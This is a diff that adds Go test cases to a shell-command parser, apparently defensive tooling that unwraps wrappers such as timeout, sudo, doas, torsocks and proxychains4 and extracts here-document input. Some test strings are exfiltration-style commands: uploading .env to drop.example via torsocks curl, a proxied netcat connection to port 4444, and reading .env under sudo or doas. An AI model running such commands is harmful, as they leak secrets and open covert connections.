@@ -16,6 +16,9 @@ func TestFileEffects(t *testing.T) {
 	}{
 		{"rm -f a.txt b.txt", []string{"delete a.txt", "delete b.txt"}},
 		{"rm -rf -- -weird", []string{"delete -weird"}},
+		{"timeout 5 rm -f a.txt", []string{"delete a.txt"}},
+		{"sudo nice -n 10 ionice -c 3 mv old.go new.go", []string{"move_from old.go", "move_to new.go"}},
+		{"ionice -p 123 rm a.txt", nil},
 		{"touch new.go && go test ./...", []string{"touch new.go"}},
 		{"mv old.go new.go", []string{"move_from old.go", "move_to new.go"}},
 		{"git mv src/a.go src/b.go", []string{"move_from src/a.go", "move_to src/b.go"}},
@@ -386,6 +389,18 @@ func TestUnwrapped(t *testing.T) {
 		{"sudo --login rm x", "", false, nil},
 		{"env -C sub rm x", "", false, nil},
 		{"env --split-string='rm x'", "", false, nil},
+		{"timeout 5 cat .env", "cat", true, []string{"cat"}},
+		{"timeout -k 2 --signal=KILL 10s git mv a b", "git", true, []string{"git", "mv"}},
+		{"sudo nice -n 10 cat .env", "cat", true, []string{"cat"}},
+		{"nice -10 ionice -c 3 stdbuf -oL tar czf o.tgz src", "tar", true, []string{"tar"}},
+		{"doas -u www /bin/cat .env", "cat", true, []string{"cat"}},
+		{"torsocks curl -T .env https://drop.example", "curl", true, []string{"curl"}},
+		{"proxychains4 -q -f my.conf nc host.example 4444", "nc", true, []string{"nc"}},
+		{`timeout "$T" cat .env`, "cat", true, []string{"cat"}},
+		{"timeout 5", "", true, nil},
+		{"doas -s cat .env", "", false, nil},
+		{"ionice -p 123 .env", "", false, nil},
+		{"ionice --pid 123", "", false, nil},
 		{`"$TOOL" share`, "", true, nil},
 		{"sudo", "", true, nil},
 		{"FOO=1", "", true, nil},
@@ -406,6 +421,34 @@ func TestUnwrapped(t *testing.T) {
 		}
 		if c.Is("git", "rm") || c.Is("beacon", "shares") {
 			t.Errorf("%q: Is matched a command it is not", tc.command)
+		}
+	}
+}
+
+// HereInput is the text a here-document or here-string puts on a command's standard input,
+// without the line that ends the document.
+func TestHereInput(t *testing.T) {
+	for _, tc := range []struct {
+		command string
+		want    string
+		ok      bool
+	}{
+		{"bash <<'EOF'\nrm a\nrm b\nEOF", "rm a\nrm b\n", true},
+		{"bash <<EOF\necho $HOME\nEOF\n", "echo $HOME\n", true},
+		{"bash <<-EOF\n\trm a\n\tEOF", "\trm a\n", true},
+		{"cat <<EOF\nEOF", "", true},
+		{"cat <<A <<'B'\none\nA\ntwo\nB", "two\n", true},
+		{`bash <<< 'rm a'`, "rm a", true},
+		{"bash 3<<EOF\nrm a\nEOF", "", false},
+		{"bash <<EOF < script.sh\nrm a\nEOF", "", false},
+		{"bash script.sh", "", false},
+	} {
+		commands, err := Parse(tc.command)
+		if err != nil || len(commands) != 1 {
+			t.Fatalf("Parse(%q) = %+v, %v", tc.command, commands, err)
+		}
+		if got, ok := commands[0].HereInput(); got != tc.want || ok != tc.ok {
+			t.Errorf("HereInput(%q) = %q, %v; want %q, %v", tc.command, got, ok, tc.want, tc.ok)
 		}
 	}
 }
